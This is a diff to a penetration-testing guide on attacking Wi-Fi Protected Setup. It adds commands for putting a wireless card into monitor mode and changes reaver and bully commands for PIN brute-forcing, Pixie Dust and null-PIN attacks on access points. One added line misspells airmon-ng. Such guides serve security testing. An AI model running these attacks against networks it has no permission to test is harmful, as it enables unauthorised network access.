@@ -27,6 +27,30 @@ Here are some known attacks on Wi-Fi Protected Setup (WPS) :
 
 ## Practice
 
+### Monitor mode
+
+The default configuration for wireless interfaces is "Managed" mode, restricting packet capture to those with a "Destination MAC" matching the interface's own MAC address.
+To capture all packets within your wireless device's range, switch the mode to "Monitor."
+
+If you have [Aircrack-ng](https://www.aircrack-ng.org/) installed, you can run the following commands in your terminal:
+```bash
+# You may need to run these commands as root or a user with privileges
+
+airmon-ng #to list all your network interfaces.
+arimon-ng check kill #to stop interfering network processes.
+airmon-ng start wlan0 #to start your network interface in monitor mode, in this case we are using wlan0.
+```
+
+If you are not using Aircrack-ng, you can run the following commands in your terminal:
+```bash
+# You may need to run these commands as root or a user with privileges
+
+iwconfig #to view your wireless interfaces and check their current mode.
+ifconfig wlan0 down #to disable the network interface you wish to change, in this case it is wlan0.
+iwconfig wlan0 mode monitor #to change the mode of wlan0 to "monitor".
+ifconfig wlan0 up #to re-enable your network interface.
+```
+
 ### Recon
 
 Wash is a tool used to detect access points with WPS (Wi-Fi Protected Setup) enabled. It can perform a survey either directly from a live interface or by scanning a list of pcap files. As an auxiliary utility, Wash is specifically crafted to showcase WPS-enabled Access Points along with their primary characteristics. This tool is bundled within the Reaver package.
@@ -43,9 +67,12 @@ Reaver is crafted to be a robust and effective attack method targeting WPS. It h
 
 ```bash
 # /!\ Beware: change placeholder values INTERFACE, BSSID-MAC, CHANNEL
+# Verbosity of output (for reaver) : -v -vv -vvv
+# Verbosity of output (for bully) : -v 1 -v 2 -v 3
+# Use 5GHz 802.11 channels : -5
 
 # With reaver :
-reaver -i [INTERFACE] -b [BSSID] -c [CHANNEL] -b -f -N [-L -d 2] -vvroot   
+reaver -i [INTERFACE] -b [BSSID] -c [CHANNEL] -vv
 
 # With bully :
 bully [INTERFACE] -b [BSSID] -c [CHANNEL] -S -F -B -v 3
@@ -60,6 +87,9 @@ Check this [list](https://docs.google.com/spreadsheets/d/1tSlbqVQ59kGn8hgmwcPTHU
 
 ```bash
 # /!\ Beware: change placeholder values INTERFACE, BSSID-MAC, CHANNEL
+# Verbosity of output (for reaver) : -v -vv -vvv
+# Verbosity of output (for bully) : -v 1 -v 2 -v 3
+# Use 5GHz 802.11 channels : -5
 
 # With reaver :
 reaver -i [INTERFACE] -b [BSSID] -c [CHANNEL] -K 1 -N -vv
@@ -74,6 +104,7 @@ Certain poorly implemented systems permitted the use of a Null PIN for connectio
 
 ```bash
 # /!\ Beware: change placeholder values INTERFACE, BSSID-MAC, CHANNEL
+# Verbosity of output (for reaver) : -v -vv -vvv
 
 reaver -i [INTERFACE] -b [BSSID] -c [CHANNEL] -f -N -g 1 -vv -p ''
 ```
@@ -95,5 +126,7 @@ Bully : https://github.com/aanarchyy/bully
 Airgeddon : https://github.com/v1s1t0r1sh3r3/airgeddon
 
 Wifite2 : https://github.com/derv82/wifite2
+
+Aircrack-ng : https://www.aircrack-ng.org
 
 Vulnerable router models : https://docs.google.com/spreadsheets/d/1tSlbqVQ59kGn8hgmwcPTHUECQ3o9YhXR91A_p7Nnj5Y
